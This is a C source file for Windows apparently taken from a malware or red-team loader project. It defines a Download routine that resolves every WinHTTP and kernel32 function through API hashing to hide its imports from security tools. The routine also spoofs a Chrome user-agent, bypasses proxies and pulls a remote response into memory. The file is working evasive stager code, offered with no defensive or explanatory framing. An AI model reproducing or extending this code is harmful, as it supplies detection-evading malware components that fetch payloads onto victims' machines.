#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#include "common.h"

#define WinHttpOpen_JOAA        0x65DBB806
#define WinHttpConnect_JOAA     0x39252400
#define WinHttpOpenRequest_JOAA         0x3E4A27F3
#define WinHttpSendRequest_JOAA         0x87B8DF4F
#define WinHttpReceiveResponse_JOAA     0xC85F7D79
#define WinHttpReadData_JOAA    0xDB080BF0
#define WinHttpCloseHandle_JOAA         0x49189A17
#define GetTickCount64_JOAA     0x00BB616E
#define LoadLibraryA_JOAA       0x54C1D227
#define KERNEL32DLL_JOAA        0x20666D0D
#define WINHTTPDLL_JOAA         0x25AE5124

API_HASHING g_Api = { 0 };

DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl)
{
    HANDLE kernel32_handle = GetModuleHandleH(KERNEL32DLL_JOAA);
    g_Api.pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernel32_handle, LoadLibraryA_JOAA);

    //__debugbreak();
    HANDLE winhttp_handle = g_Api.pLoadLibraryA("winhttp.dll");

    g_Api.pWinHttpOpen = (fnWinHttpOpen)GetProcAddressH(winhttp_handle, WinHttpOpen_JOAA);
    g_Api.pWinHttpConnect = (fnWinHttpConnect)GetProcAddressH(winhttp_handle, WinHttpConnect_JOAA);
    g_Api.pWinHttpOpenRequest = (fnWinHttpOpenRequest)GetProcAddressH(winhttp_handle, WinHttpOpenRequest_JOAA);
    g_Api.pWinHttpSendRequest = (fnWinHttpSendRequest)GetProcAddressH(winhttp_handle, WinHttpSendRequest_JOAA);
    g_Api.pWinHttpReceiveResponse = (fnWinHttpReceiveResponse)GetProcAddressH(winhttp_handle, WinHttpReceiveResponse_JOAA);
    g_Api.pWinHttpReadData = (fnWinHttpReadData)GetProcAddressH(winhttp_handle, WinHttpReadData_JOAA);
    g_Api.pWinHttpCloseHandle = (fnWinHttpCloseHandle)GetProcAddressH(winhttp_handle, WinHttpCloseHandle_JOAA);
    g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);

    if (g_Api.pGetTickCount64 == NULL) printf("GetTickCount64\n");
    if (g_Api.pWinHttpOpen == NULL) printf("WinHttpOpen\n");
    if (g_Api.pWinHttpConnect == NULL) printf("WinHttpConnect\n");
    if (g_Api.pWinHttpOpenRequest == NULL) printf("WinHttpOpenRequest\n");
    if (g_Api.pWinHttpSendRequest == NULL) printf("WinHttpSendRequest\n");
    if (g_Api.pWinHttpReceiveResponse == NULL) printf("WinHttpReceiveResponse\n");
    if (g_Api.pWinHttpReadData == NULL) printf("WinHttpReadData\n");
    if (g_Api.pWinHttpCloseHandle == NULL) printf("WinHttpCloseHandle\n");

    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    const DWORD bufferSize = 1024;
    char buffer[1024];

    HINTERNET hSession = g_Api.pWinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession == NULL)
        return -1;

    // connect to remote server
    INTERNET_PORT port = ssl ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    HINTERNET hConnect = g_Api.pWinHttpConnect(hSession, url, port, 0);

    if (hConnect == NULL)
    {
        g_Api.pWinHttpCloseHandle(hSession);
        return -1;
    }

    DWORD flags = ssl ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = g_Api.pWinHttpOpenRequest(hConnect, L"GET", endpoint, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);

    BOOL status = g_Api.pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (!status)
    {
        g_Api.pWinHttpCloseHandle(hSession);
        g_Api.pWinHttpCloseHandle(hConnect);
        g_Api.pWinHttpCloseHandle(hRequest);
        return -1;
    }

    status = g_Api.pWinHttpReceiveResponse(hRequest, NULL);

    if (!status)
    {
        g_Api.pWinHttpCloseHandle(hSession);
        g_Api.pWinHttpCloseHandle(hConnect);
        g_Api.pWinHttpCloseHandle(hRequest);
        return -1;
    }

    *response = (char*)malloc(1);
    do {
        if (g_Api.pWinHttpReadData(hRequest, buffer, bufferSize, &bytesRead)) {
            if (bytesRead > 0) {
                char* temp = (char*)realloc(*response, totalBytesRead + bytesRead + 1);
                if (temp == NULL) {
                    return -1;
                }
                else {
                    *response = temp;
                    memcpy(*response + totalBytesRead, buffer, bytesRead);
                    totalBytesRead += bytesRead;
                    (*response)[totalBytesRead] = '\0';
                }
            }
        }
    } while (bytesRead > 0);

    g_Api.pWinHttpCloseHandle(hSession);
    g_Api.pWinHttpCloseHandle(hConnect);
    g_Api.pWinHttpCloseHandle(hRequest);
    return totalBytesRead;
}
